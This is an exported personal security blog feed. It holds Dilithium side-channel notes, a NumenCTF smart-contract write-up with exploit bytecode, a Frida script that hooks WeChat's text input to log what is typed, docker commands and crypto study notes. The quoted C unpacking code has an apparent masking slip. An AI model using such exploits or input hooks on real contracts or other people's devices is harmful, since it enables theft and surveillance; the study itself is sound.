<tbody>
<tr>
<td>https://pq-crystals.org/dilithium/data/dilithium-specification-round3-20210208.pdf,
[BDK+]</td>
<td></td>
<td>NIST implement document.</td>
</tr>
<tr>
<td>[DKL+18]</td>
<td></td>
<td>similar to doc above.</td>
</tr>
<tr>
<td><a href="#MUTS22">MUTS22</a></td>
<td></td>
<td>when <span class="math inline">\(y_{i, j}\)</span> is zero.</td>
</tr>
<tr>
<td>[RJH+18]</td>
<td></td>
<td>only s_1 can also sign</td>
</tr>
<tr>
<td>Lyubashevsky</td>
<td>Fiat-Shamir with Aborts framework</td>
<td></td>
</tr>
<tr>
<td>DDLL13</td>
<td>BLISS signature scheme</td>
<td></td>
</tr>
<tr>
<td>https://eprint.iacr.org/2023/1891</td>
<td>CPA-PoI on NTT</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h1 id="muts22">MUTS22</h1>
<p>recovering <span class="math inline">\(s_1\)</span> based on
<strong><em>Multi-Layer Perceptron (MLP)</em></strong> machine-learning,
and according to a [RJH+18], it's possible to sign using just that
knowledge. the leaking point is bit-unpacking function when generating
the vector <strong>y</strong> (input <span class="math inline">\(\rho^{&#39;}\)</span> in XOF to generate a byte
string and unpacked it into <span class="math inline">\(\ell\)</span>
polynomials, who has N cocoefficients). the function use in [BDK+]:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">polyz_unpack</span><span class="params">(poly *r, <span class="type">const</span> <span class="type">uint8_t</span> *a)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">  DBENCH_START();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> GAMMA1 == (1 &lt;&lt; 17)</span></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; N/<span class="number">4</span>; ++i) &#123;</span><br><span class="line">    r-&gt;coeffs[<span class="number">4</span>*i+<span class="number">0</span>]  = a[<span class="number">9</span>*i+<span class="number">0</span>];</span><br><span class="line">    r-&gt;coeffs[<span class="number">4</span>*i+<span class="number">0</span>] |= (<span class="type">uint32_t</span>)a[<span class="number">9</span>*i+<span class="number">1</span>] &lt;&lt; <span class="number">8</span>;</span><br><span class="line">    r-&gt;coeffs[<span class="number">4</span>*i+<span class="number">0</span>] |= (<span class="type">uint32_t</span>)a[<span class="number">9</span>*i+<span class="number">2</span>] &lt;&lt; <span class="number">16</span>;</span><br><span class="line">    r-&gt;coeffs[<span class="number">4</span>*i+<span class="number">0</span>] &amp;= <span class="number">0x3FFFF</span>;</span><br><span class="line"></span><br><span class="line">    r-&gt;coeffs[<span class="number">4</span>*i+<span class="number">1</span>]  = a[<span class="number">9</span>*i+<span class="number">2</span>] &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    r-&gt;coeffs[<span class="number">4</span>*i+<span class="number">1</span>] |= (<span class="type">uint32_t</span>)a[<span class="number">9</span>*i+<span class="number">3</span>] &lt;&lt; <span class="number">6</span>;</span><br><span class="line">    r-&gt;coeffs[<span class="number">4</span>*i+<span class="number">1</span>] |= (<span class="type">uint32_t</span>)a[<span class="number">9</span>*i+<span class="number">4</span>] &lt;&lt; <span class="number">14</span>;</span><br><span class="line">    r-&gt;coeffs[<span class="number">4</span>*i+<span class="number">1</span>] &amp;= <span class="number">0x3FFFF</span>;</span><br><span class="line"></span><br><span class="line">    r-&gt;coeffs[<span class="number">4</span>*i+<span class="number">2</span>]  = a[<span class="number">9</span>*i+<span class="number">4</span>] &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    r-&gt;coeffs[<span class="number">4</span>*i+<span class="number">2</span>] |= (<span class="type">uint32_t</span>)a[<span class="number">9</span>*i+<span class="number">5</span>] &lt;&lt; <span class="number">4</span>;</span><br><span class="line">    r-&gt;coeffs[<span class="number">4</span>*i+<span class="number">2</span>] |= (<span class="type">uint32_t</span>)a[<span class="number">9</span>*i+<span class="number">6</span>] &lt;&lt; <span class="number">12</span>;</span><br><span class="line">    r-&gt;coeffs[<span class="number">4</span>*i+<span class="number">2</span>] &amp;= <span class="number">0x3FFFF</span>;</span><br><span class="line"></span><br><span class="line">    r-&gt;coeffs[<span class="number">4</span>*i+<span class="number">3</span>]  = a[<span class="number">9</span>*i+<span class="number">6</span>] &gt;&gt; <span class="number">6</span>;</span><br><span class="line">    r-&gt;coeffs[<span class="number">4</span>*i+<span class="number">3</span>] |= (<span class="type">uint32_t</span>)a[<span class="number">9</span>*i+<span class="number">7</span>] &lt;&lt; <span class="number">2</span>;</span><br><span class="line">    r-&gt;coeffs[<span class="number">4</span>*i+<span class="number">3</span>] |= (<span class="type">uint32_t</span>)a[<span class="number">9</span>*i+<span class="number">8</span>] &lt;&lt; <span class="number">10</span>;</span><br><span class="line">    r-&gt;coeffs[<span class="number">4</span>*i+<span class="number">3</span>] &amp;= <span class="number">0x3FFFF</span>;</span><br><span class="line"></span><br><span class="line">    r-&gt;coeffs[<span class="number">4</span>*i+<span class="number">0</span>] = GAMMA1 - r-&gt;coeffs[<span class="number">4</span>*i+<span class="number">0</span>];</span><br><span class="line">    r-&gt;coeffs[<span class="number">4</span>*i+<span class="number">1</span>] = GAMMA1 - r-&gt;coeffs[<span class="number">4</span>*i+<span class="number">1</span>];</span><br><span class="line">    r-&gt;coeffs[<span class="number">4</span>*i+<span class="number">2</span>] = GAMMA1 - r-&gt;coeffs[<span class="number">4</span>*i+<span class="number">2</span>];</span><br><span class="line">    r-&gt;coeffs[<span class="number">4</span>*i+<span class="number">3</span>] = GAMMA1 - r-&gt;coeffs[<span class="number">4</span>*i+<span class="number">3</span>];</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> GAMMA1 == (1 &lt;&lt; 19)</span></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; N/<span class="number">2</span>; ++i) &#123;</span><br><span class="line">    r-&gt;coeffs[<span class="number">2</span>*i+<span class="number">0</span>]  = a[<span class="number">5</span>*i+<span class="number">0</span>];</span><br><span class="line">    r-&gt;coeffs[<span class="number">2</span>*i+<span class="number">0</span>] |= (<span class="type">uint32_t</span>)a[<span class="number">5</span>*i+<span class="number">1</span>] &lt;&lt; <span class="number">8</span>;</span><br><span class="line">    r-&gt;coeffs[<span class="number">2</span>*i+<span class="number">0</span>] |= (<span class="type">uint32_t</span>)a[<span class="number">5</span>*i+<span class="number">2</span>] &lt;&lt; <span class="number">16</span>;</span><br><span class="line">    r-&gt;coeffs[<span class="number">2</span>*i+<span class="number">0</span>] &amp;= <span class="number">0xFFFFF</span>;</span><br><span class="line"></span><br><span class="line">    r-&gt;coeffs[<span class="number">2</span>*i+<span class="number">1</span>]  = a[<span class="number">5</span>*i+<span class="number">2</span>] &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    r-&gt;coeffs[<span class="number">2</span>*i+<span class="number">1</span>] |= (<span class="type">uint32_t</span>)a[<span class="number">5</span>*i+<span class="number">3</span>] &lt;&lt; <span class="number">4</span>;</span><br><span class="line">    r-&gt;coeffs[<span class="number">2</span>*i+<span class="number">1</span>] |= (<span class="type">uint32_t</span>)a[<span class="number">5</span>*i+<span class="number">4</span>] &lt;&lt; <span class="number">12</span>;</span><br><span class="line">    r-&gt;coeffs[<span class="number">2</span>*i+<span class="number">0</span>] &amp;= <span class="number">0xFFFFF</span>;</span><br><span class="line"></span><br><span class="line">    r-&gt;coeffs[<span class="number">2</span>*i+<span class="number">0</span>] = GAMMA1 - r-&gt;coeffs[<span class="number">2</span>*i+<span class="number">0</span>];</span><br><span class="line">    r-&gt;coeffs[<span class="number">2</span>*i+<span class="number">1</span>] = GAMMA1 - r-&gt;coeffs[<span class="number">2</span>*i+<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  DBENCH_STOP(*tpack);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>two phases:</p>
<ol type="1">
<li><strong>profiling phase</strong>: execute signing process with
random input messages on A device and collect the power usage during the
execution of the <strong><em>bit-unpacking function</em></strong>.
Training their classifiers with labelled traces of sensitive internal
data.</li>
<li><strong>attack phase</strong>：By observing the power traces of the
signature generation on Device B, predicting the sensitive internal
data, using <strong><em>Least Squares Method(LSM)</em></strong> to get a
solution candidate and uncovering the secret key <span class="math inline">\(s_1\)</span> by solving an <strong><em>Integer
Linear Program(ILP)</em></strong>.</li>
</ol>
<p>you cant distinguish the difference of an unpacking result between
zero and none-zero, so they train machine-learning classifiers</p>
<p>(I indeed cant distinguish it)</p>
<p><img src="/images/Learning-record-of-Dilithium/image-20231116123634446.png" alt="image-20231116123634446" style="zoom:50%;"></p>
<p>it is obvious that when <span class="math inline">\(y_{i, j}\)</span>
is zero one can recovery the secret <span class="math inline">\(s_1\)</span>, so authors use the ml tech to
distinguish whether it's zero or none-zero. when this is done, thing's
getting easy.</p>
<h3 id="section"></h3>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>PQC</tag>
      </tags>
  </entry>
  <entry>
    <title>NumenCTF</title>
    <url>/2023/04/04/2023/NumenCTF/</url>
    <content><![CDATA[<p>合约审计比赛</p>
<span id="more"></span>
<h1 id="wp">wp</h1>
<p><a href="https://cn-sec.com/archives/1645084.html">NUMEN CTF writeup
by ChaMd5 | CN-SEC 中文网</a></p>
<p><a href="https://defihacklabs.substack.com/">DeFiHackLabs’s Substack
| SunWeb3Sec | Substack</a></p>
<h1 id="simplecall">SimpleCall</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.7.0;</span><br><span class="line">	</span><br><span class="line">contract ExistingStock &#123;</span><br><span class="line"></span><br><span class="line">	address public owner;</span><br><span class="line">    address private reserve;</span><br><span class="line"></span><br><span class="line">	string public name = &quot;Existing Stock&quot;;</span><br><span class="line">	string public symbol = &quot;ES&quot;;</span><br><span class="line">	uint256 public decimals = 18;</span><br><span class="line">	uint256 public totalSupply = 200000000000;</span><br><span class="line">    uint8 public frequency = 1;</span><br><span class="line"></span><br><span class="line">	bool public Lock = false;</span><br><span class="line">	bool public result;</span><br><span class="line">	bool public flag;</span><br><span class="line"></span><br><span class="line">	event Approval(address indexed from, address indexed to, uint number);</span><br><span class="line">	event Transfer(address indexed from, address indexed to, uint number);</span><br><span class="line">	event Deposit(address indexed to, uint number);</span><br><span class="line">	event Withdraw(address indexed from, uint number);</span><br><span class="line">    event Target(address indexed from, bool result);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	mapping (address =&gt; uint) public balanceOf;</span><br><span class="line">	mapping (address =&gt; mapping (address =&gt; uint)) public allowance;</span><br><span class="line"></span><br><span class="line">	constructor() public &#123;</span><br><span class="line">	    owner = msg.sender;</span><br><span class="line">	    balanceOf[owner] = totalSupply;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function approve(address to, uint number) public returns (bool) &#123;</span><br><span class="line">	    allowance[msg.sender][to] = number;</span><br><span class="line">	    emit Approval(msg.sender, to, number);</span><br><span class="line">	    return true;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">	    require(balanceOf[msg.sender] - _value &gt;= 0);</span><br><span class="line">	    balanceOf[msg.sender] -= _value;</span><br><span class="line">	    balanceOf[_to] += _value;</span><br><span class="line">	    return true;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	function transferFrom(address from, address to, uint number) public returns (bool)&#123;</span><br><span class="line"></span><br><span class="line">        require(balanceOf[from] &gt;= number);</span><br><span class="line"></span><br><span class="line">	    if (from != msg.sender &amp;&amp; allowance[from][msg.sender] != uint256(-1)) &#123;</span><br><span class="line">	        require(allowance[from][msg.sender] &gt;= number);</span><br><span class="line">	        allowance[from][msg.sender] -= number;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	    balanceOf[from] -= number;</span><br><span class="line">	    balanceOf[to] += number;</span><br><span class="line">	</span><br><span class="line">	    emit Transfer(from, to, number);</span><br><span class="line">	    return true;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function privilegedborrowing(uint256 value,address secure,address target,bytes memory data) public &#123;</span><br><span class="line">        require(Lock == false &amp;&amp; value &gt;= 0 &amp;&amp; value &lt;= 1000);</span><br><span class="line">	    balanceOf[address(this)] -= value;</span><br><span class="line">	    balanceOf[target] += value;</span><br><span class="line"></span><br><span class="line">	    address(target).call(data);</span><br><span class="line">	</span><br><span class="line">	    Lock = true; </span><br><span class="line"></span><br><span class="line">	    require(balanceOf[target] &gt;= value);</span><br><span class="line">	    balanceOf[address(this)] += value;</span><br><span class="line">	    balanceOf[target] -= value;</span><br><span class="line"></span><br><span class="line">	    Lock = false;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint number) public &#123;</span><br><span class="line">	    require(balanceOf[msg.sender] &gt;= number);</span><br><span class="line">	    balanceOf[msg.sender] -= number;</span><br><span class="line">	    (msg.sender).transfer(number);</span><br><span class="line">	    emit Withdraw(msg.sender, number);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function setflag() public &#123;</span><br><span class="line">	    if(balanceOf[msg.sender] &gt; 200000 &amp;&amp; allowance[address(this)][msg.sender] &gt; 200000)&#123;</span><br><span class="line">			flag = true;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function isSolved() public view returns(bool)&#123;</span><br><span class="line">	    return flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要满足的是：</p>
<p><img src="/images/NumenCTF/image-20230416224902698.png" alt="image-20220828145823279"></p>
<p>balanceOf会下溢，利用transfer函数可以满足第一个条件：</p>
<p><img src="/images/NumenCTF/image-20230416230045087.png" alt="image-20230416230045087"></p>
<p>只有approve能修改allowance，但是发起方只能是msg.sender</p>
<p><img src="/images/NumenCTF/image-20230404105532045.png" alt="image-20230404105532045"></p>
<p>privilegeborrowing存在任意地址的call调用，调用后会使得msg.sender改为target，所以可以满足第二个条件</p>
<p><img src="/images/NumenCTF/image-20230404105113104.png" alt="image-20230404105113104"></p>
<p><img src="/images/NumenCTF/image-20230330182715865.png" alt="image-20230330182715865"></p>
<p><img src="/images/NumenCTF/JMFR4%7B6%5BS%5DQ4O8W0YE4VDEU.png" alt="img"></p>
<h1 id="counter">counter</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract Deployer &#123;</span><br><span class="line">    constructor(bytes memory code) &#123; </span><br><span class="line">        assembly &#123; return (add(code, 0x20), mload(code)) &#125; </span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract SmartCounter&#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    address public target;</span><br><span class="line">    bool flag=false;</span><br><span class="line">    constructor(address owner_)&#123;</span><br><span class="line">        owner=owner_;</span><br><span class="line">    &#125;</span><br><span class="line">    function create(bytes memory code) public&#123;</span><br><span class="line">        require(code.length&lt;=24);</span><br><span class="line">        target=address(new Deployer(code));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function A_delegateccall(bytes memory data) public&#123;</span><br><span class="line">        (bool success,bytes memory returnData)=target.delegatecall(data);</span><br><span class="line">        require(owner==msg.sender);</span><br><span class="line">        flag=true;</span><br><span class="line">    &#125;</span><br><span class="line">    function isSolved() public view returns(bool)&#123;</span><br><span class="line">        return flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先学一下solidity的内存布局<a href="https://www.jianshu.com/p/f01a5790e8cb">Solidity - 内存布局 - 简书
(jianshu.com)</a></p>
<p>delegatecall调用的时候我们的地址会变成tx.origin，又由于owner在slot0，所以把tx.origin存到slot0即可满足owner=msg.sender。构造的code为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ORIGIN</span><br><span class="line">PUSH1 0x00</span><br><span class="line">SSTORE</span><br><span class="line"></span><br><span class="line">32600055</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
        <category>blockchain</category>
      </categories>
      <tags>
        <tag>blockchain</tag>
      </tags>
  </entry>
  <entry>
    <title>Sequences of Games</title>
    <url>/2023/07/09/2023/Sequences-of-Games/</url>
    <content><![CDATA[<p>关于《Sequences of Games: A Tool for Taming Complexity in Security
Proofs∗》的总结和疑问</p>
<span id="more"></span>
<p>咨询可证明安全的学习建议时，沛公和Tover师傅推荐读这篇论文（还有《Introduction
to Modern Cryptography 》，有空再看T-T）</p>
<p>PS：最近一两个月给我的感觉，臭打CTF的，密码学压根没入门23333，还有好多好多要学的，计算复杂性、可证明安全、UC等等，总之任重道远，进入正题。</p>
<h1 id="介绍">介绍</h1>
<p>总的来说，关于安全规约有两种方式，基于游戏的和基于模拟的安全，这篇文章主要是介绍如何使用基于游戏的安全证明来保证一个方案是安全的，其基本方法是假设一堆游戏，Game
0, Game 1, ... , Game n, 其中Game
0是关于对手和方案的原始攻击游戏，并定义<span class="math display">\[S_0,
S_1, ... ,S_n\]</span>为Game中的事件。随后，通过一步步推导，得到<span class="math display">\[\text{Pr}[S_0]\]</span>和之后的事件差距很小（negligibly
close）或相等，最后说明<span class="math display">\[\text{Pr}[S_n]\]</span>与一个目标概率相等或可忽略不计，则可证明是安全的。</p>
<p>为了让证明尽可能简洁，连续游戏之间的变换有三种类型：</p>
<ol type="1">
<li><strong>Transitions based on indistinguishability</strong></li>
<li><strong>Transitions based on failure events</strong></li>
<li><strong>Bridging steps</strong></li>
</ol>
<h2 id="基于不可区分的过渡">基于不可区分的过渡</h2>
<p>假定有一个很小的改变在连续的游戏之间，如果被敌手所检测到，就说明存在一个高效的算法能区分两个不可区分的分布。例如：</p>
<p>假设<span class="math display">\[P_1\]</span>和<span class="math display">\[P_2\]</span>是两个不可区分的分布，为了证明<span class="math display">\[|\text{Pr}[S_i] -
\text{Pr}[S_{i+1}]|\]</span>是忽略不计的，假定存在一个区分算法（distinguishing
algorithm）<span class="math display">\[ D\]</span> 插入在Game i和Game
i+1之间，当输入为取自分布<span class="math display">\[ P_1\]</span>
的元素时，D输出1的概率为<span class="math display">\[
\text{Pr}[S_i]\]</span> ；当输入为取自分布<span class="math display">\[
P_2\]</span> 的元素时，D输出1的概率为<span class="math display">\[
\text{Pr}[S_{i+1}]\]</span> ，于是不可区分性就证明了<span class="math display">\[|\text{Pr}[S_i] -
\text{Pr}[S_{i+1}]|\]</span>是忽略不计的。</p>
<h2 id="基于失败事件的过渡">基于失败事件的过渡</h2>
<p>在这种情况下，Game i 和Game i+1完全相同除非事件<span class="math display">\[F\]</span>发生。为了尽可能简洁，最好要让两个Game定义在两个相同的概率空间，唯一的不同是计算某些随机变量。所以有：
<span class="math display">\[
S_i\land F \Longleftrightarrow S_{i+1} \land F
\]</span> 也就是说<span class="math display">\[S_i\land F 和\]</span>
<span class="math display">\[S_{i+1} \land
F\]</span>相同，证明也不困难，利用<strong>Difference
Lemma</strong>(其实非常trivial)</p>
<p><img src="/images/Sequences-of-Games/image-20230709214524408.png" alt="image-20230709214524408"></p>
<p>所以只需要证明<span class="math display">\[\text{Pr}[F]\]</span>是可忽略不计的就可以得到结论，通常这又是基于一个安全假设（例如当F发生时，敌手发现了一个哈希碰撞或者伪造了一个MAC）。</p>
<p>---------------------------------------下面这两段没太懂------------------------------</p>
<p><img src="/images/Sequences-of-Games/image-20230709215538103.png" alt="image-20230709215538103"></p>
<p>比如第一段的最后一句，通常其中某个game会更适合分析得出清晰的证明，难道不需要分析F和二者之间吗？</p>
<p>以及第二段的第二句开始到最后都不太懂。</p>
<h2 id="桥接步骤">桥接步骤</h2>
<p>这个我觉得是最玄乎的方式，以相同的方式重述某些量的计算，改变是完全概念上的，就可以得到<span class="math display">\[\text{Pr}[S_i] = \text{Pr}[S_{i+1}]\]</span></p>
<p>后面也只介绍了为什么要引入这个方式：如果没有它某些证明就会很麻烦0.0.</p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>可证明安全</tag>
      </tags>
  </entry>
  <entry>
    <title>android vx reverse</title>
    <url>/2023/08/23/2023/android%20vx%20reverse/</url>
    <content><![CDATA[<p>s偷</p>
<span id="more"></span>
<p>参考https://juejin.cn/post/6844904098328739853</p>
<p>官方提供hook 模板https://frida.re/docs/examples/android/</p>
<p>hook输入框https://www.jianshu.com/p/82d2bfeb4fbf</p>
<p>获取输入框</p>
<p><img src="/images/android%20vx%20reverse/image-20230823154613871.png" alt="image-20230823154613871" style="zoom:50%;"></p>
<p><img src="/images/android%20vx%20reverse/image-20230823154710130.png" alt="image-20230823154710130" style="zoom:50%;"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Java.perform(() =&gt; &#123;</span></span><br><span class="line"><span class="string">    let MMFlexEditText = Java.use(&quot;com.tencent.mm.ui.widget.cedit.api.MMFlexEditText&quot;);</span></span><br><span class="line"><span class="string">    var CharSequence = Java.use(&quot;java.lang.CharSequence&quot;);</span></span><br><span class="line"><span class="string">    MMFlexEditText[&quot;getText&quot;].implementation = function () &#123;</span></span><br><span class="line"><span class="string">        console.log(`MMFlexEditText.getText is called`);</span></span><br><span class="line"><span class="string">        let result = this[&quot;getText&quot;]();</span></span><br><span class="line"><span class="string">        var resultStr = Java.cast(result, CharSequence);</span></span><br><span class="line"><span class="string">        console.log(`MMFlexEditText.getText result=$&#123;resultStr&#125;`);</span></span><br><span class="line"><span class="string">        return result;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process = frida.get_usb_device().attach(<span class="string">&#x27;微信&#x27;</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*] Running CTF&#x27;</span>)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>
<p>创建发起动态 <img src="/images/android%20vx%20reverse/image-20230823162611566.png" alt="image-20230823162611566"></p>
<p><img src="/images/android%20vx%20reverse/image-20230823162854590.png" alt="image-20230823162854590" style="zoom:50%;"></p>
<p>两个pj.c.l是在输入法展开时进行，返回值恒为4000</p>
<h1 id="访问量">访问量</h1>
<p><img src="/images/android%20vx%20reverse/image-20230825103210829.png" alt="image-20230825103210829" style="zoom:50%;"></p>
<p>class: android.widget.TextView</p>
<p>resource-id: com.tencent.mm:id/m6r</p>
<p>搜索框类：com.tencent.mm.ui.search.FTSEditTextView.e</p>
<p><img src="/images/android%20vx%20reverse/image-20230825105846853.png" alt="image-20230825105846853" style="zoom:50%;"></p>
<p><img src="/images/android%20vx%20reverse/image-20230825110010120.png" alt="image-20230825110010120"></p>
]]></content>
      <categories>
        <category>security</category>
      </categories>
      <tags>
        <tag>vx</tag>
        <tag>Android reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>docker常用命令</title>
    <url>/2023/04/18/2023/docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<p>不想老是搜了</p>
<span id="more"></span>
<h1 id="镜像操作">镜像操作</h1>
<ul>
<li><p>拉取镜像 <figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker pull image_name</span></span><br></pre></td></tr></table></figure></p></li>
<li><p>搜索镜像</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker search image_name</span></span><br></pre></td></tr></table></figure></li>
<li><p>镜像列表</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker images</span></span><br></pre></td></tr></table></figure></li>
<li><p>删除镜像</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker rmi image_name</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="容器操作">容器操作</h1>
<ul>
<li><p>启动镜像建立容器</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">run</span> image_name</span><br></pre></td></tr></table></figure>
<ul>
<li><p>建立并打开 STDIN，和shell交互</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">run</span> -<span class="keyword">it</span> image_name</span><br></pre></td></tr></table></figure></li>
<li><p>挂载文件夹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -v $&quot;pwd&quot;:/share image_name </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">docker run -it -v <span class="string">&quot;<span class="variable">$PWD</span>&quot;</span>:/home/share christoftorres/osiris</span></span><br></pre></td></tr></table></figure></li>
<li><p>指定容器名</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">run</span> <span class="attribute">--name</span>=container_name image_name</span><br></pre></td></tr></table></figure></li>
</ul></li>
<li><p>查看容器列表</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span></span><br></pre></td></tr></table></figure></li>
<li><p>启动容器</p></li>
</ul>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">docker <span class="literal">start</span> container_name</span><br></pre></td></tr></table></figure>
<ul>
<li><p>启动并交互</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">docker <span class="literal">start</span> -i container_name</span><br></pre></td></tr></table></figure></li>
<li><p>关闭容器</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">docker stop container_name</span><br></pre></td></tr></table></figure></li>
<li><p>重启容器</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker restart container_name</span></span><br></pre></td></tr></table></figure></li>
<li><p>删除容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> container_name</span><br></pre></td></tr></table></figure>
<ul>
<li><p>删除指定镜像的所有容器</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">docker rm <span class="constructor">$(<span class="params">docker</span> <span class="params">ps</span> -<span class="params">a</span> | <span class="params">grep</span> <span class="string">&quot;image_name&quot;</span> | <span class="params">awk</span> &#x27;&#123;<span class="params">print</span> $1&#125;&#x27;)</span></span><br></pre></td></tr></table></figure></li>
</ul></li>
<li><p>文件拷贝</p>
<ul>
<li><p>当前目录-&gt;容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> file_name container_name:/file_path</span><br></pre></td></tr></table></figure></li>
<li><p>容器-&gt;当前目录</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">docker</span> <span class="meta">cp</span>  container_name:file_name</span><br></pre></td></tr></table></figure></li>
</ul></li>
</ul>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Zero Knowledge Proofs</title>
    <url>/2023/01/30/2023/Zero-Knowledge-Proofs/</url>
    <content><![CDATA[<p>This is the record of my study of ZKP</p>
<span id="more"></span>
<p>latex是真难敲这些密码学定义，干脆截图</p>
<h1 id="introduction-and-history-of-zkp">Introduction and History of
ZKP</h1>
<h2 id="what-is-proofs">what is Proofs</h2>
<p>Mainly to introduce some definitions：</p>
<p><strong>Proofs</strong>: For a <strong>Claim</strong>, the
<strong>Prover</strong> provides a <strong>proof</strong>
<strong>w</strong> to prove the correctness of the
<strong>Claim</strong> <strong>x</strong>, and the
<strong>Verifier</strong> decides to accept/reject based on the
<strong>proof</strong></p>
<p><span class="math display">\[ \begin{align*}\label{2}
  &amp; \rm \textbf{Def: A language }\textit{L} \text{ is a set of
binary strings x}\\
\end{align*}\]</span></p>
<p><img src="/images/Zero-Knowledge-Proofs/image-20230522224623815-1687768159269-1687768206432.png" alt="image-20230522224623815"><br>
</p>
<p>For example: Large number factoring(N = p*q), quadratic residue(y,
N), the two graphs are isomorphic.</p>
<p><strong>Zero Knowledge Proofs</strong> means <strong>Prover</strong>
prove that I could prove it If I felt like it.</p>
<h2 id="zero-knowledge-interactive-proofs">Zero Knowledge Interactive
Proofs</h2>
<p>there are Two New Ingredients: <strong>Interactive</strong> and
<strong>Probabilistic Proofs</strong>:</p>
<ul>
<li><strong>Interaction</strong>: rather than passively “reading” proof,
<strong>verifier</strong> engages in a non-trivial
<strong>interaction</strong> with the <strong>prover</strong>.</li>
<li><strong>Randomness</strong>: verifier is randomized (tosses coins as
a primitive operation), and can err in accept/reject with small
probability</li>
<li>PS: the prover can compute in unbounded time, but the verifier can
